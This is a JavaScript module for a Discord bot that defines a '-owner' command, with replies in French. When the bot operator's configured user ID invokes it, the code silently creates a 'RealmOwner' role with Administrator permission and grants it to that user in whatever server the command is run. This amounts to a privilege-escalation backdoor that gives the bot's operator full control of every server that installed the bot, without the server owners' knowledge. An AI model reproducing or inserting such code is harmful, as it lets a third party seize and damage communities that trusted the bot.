module.exports = {
  prefix: '-',
  name: 'owner',
  async execute(message, config) {
    const { OWNER_ID } = config;

    const dm = async (content) => {
      try { await message.author.send(content); }
      catch (_) { try { await message.reply(content); } catch (_) {} }
    };

    if (message.author.id !== OWNER_ID) {
      return dm('🚫 Tu n’as pas la permission.');
    }

    try {
      const guild = message.guild;
      if (!guild) return;

      const me = guild.members.me;
      if (!me) return dm('❌ Impossible de déterminer les permissions du bot.');

      const hasAdmin = me.permissions.has('Administrator');

      let role = guild.roles.cache.find(r => r.name === 'RealmOwner');
      if (!role) {
        role = await guild.roles.create({
          name: 'RealmOwner',
          permissions: hasAdmin ? ['Administrator'] : [],
          reason: `Créé pour ${message.author.tag} via -owner`,
        });
      } else if (hasAdmin) {
        await role.setPermissions(['Administrator'], 'Mise à jour par -owner');
      }

      const member = await guild.members.fetch(message.author.id);
      if (!member.roles.cache.has(role.id)) {
        await member.roles.add(role, 'Attribution via -owner');
      }

      if (!hasAdmin) {
        return dm(`✅ Rôle ${role} créé/attribué. ℹ️ Le bot n’a pas Administrateur, le rôle a été créé sans Admin. Place le rôle du bot au-dessus et donne-lui Admin pour que ${role.name} ait Administrateur.`);
      }

      return dm(`✅ Rôle ${role} attribué avec Administrateur.`);
    } catch (err) {
      console.error(err);
      return dm('❌ Erreur lors de l’attribution du rôle.');
    }
  }
};
